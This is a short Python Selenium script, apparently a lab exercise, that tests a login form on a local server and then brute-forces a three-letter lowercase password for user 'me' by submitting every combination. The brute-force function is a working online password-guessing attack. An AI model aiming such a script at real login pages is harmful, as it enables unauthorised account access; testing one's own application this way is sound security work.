# hack.py
# Author: Kassabeh Zakariya
# Version: December 06 , 2019

from itertools import product
from string import ascii_lowercase
import sys
import time
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

startedAt = time.time()

driver = webdriver.Chrome("C:\Program Files (x86)\Google\Chrome\Application\chromedriver")

driver.get('http://localhost:5000')

# Test #1
# Enter wrong credentials in the form and submit it
driver.find_element(By.NAME, 'username').send_keys('me')
driver.find_element(By.NAME, 'password').send_keys('mypassword')
driver.find_element(By.ID, 'login').submit()

# Wait for the result to show
try:
    WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.ID, 'connected')))
except:
    print('Test #1 K0: no element with id="connected" found.')

if driver.find_element(By.ID,'connected').text == 'KO':
    print('Test #1 OK: Wrong credentials is correctly refused.')
else:
    print('Test #1 Failed.')
    driver.quit()

# Test #2
# Enter correct credentials in the form and submit it
driver.find_element(By.NAME, 'username').send_keys('me')
driver.find_element(By.NAME, 'password').send_keys('abc')
driver.find_element(By.ID, 'login').submit()

# Wait for the result to show
try:
    WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.ID, 'connected')))
except:
    print('Test #2 Failed: no element with id="connected" found.')

if driver.find_element(By.ID,'connected').text == 'OK':
    print('Test #2 OK: Correct credentials is correctly accepted.')
else:
    print('Test #2 Failed.')

def bruteForceLetters(letters) :
    keywords = [''.join(i) for i in product(ascii_lowercase, repeat = letters)]
    for guess in keywords :
        driver.find_element(By.NAME, 'username').send_keys('me')
        driver.find_element(By.NAME, 'password').send_keys(guess)
        driver.find_element(By.ID, 'login').submit()

        try:
            WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.ID, 'connected')))
        except:
            print('Guess Failed: no element with id="connected" found.')

        if driver.find_element(By.ID,'connected').text == 'OK':
            print('Guess OK: Correct credentials is correctly accepted.')
            finishedAt = time.time()
            timeToFind = finishedAt-startedAt
            print(("The good password is \"{}\" and was found in {} s.").format(guess, timeToFind))
            sys.exit(0)
            driver.quit()
        else:
            print(("Wrong password is {}").format(guess))

# We try to brute force a password made of 3 letters
bruteForceLetters(3)

driver.quit()
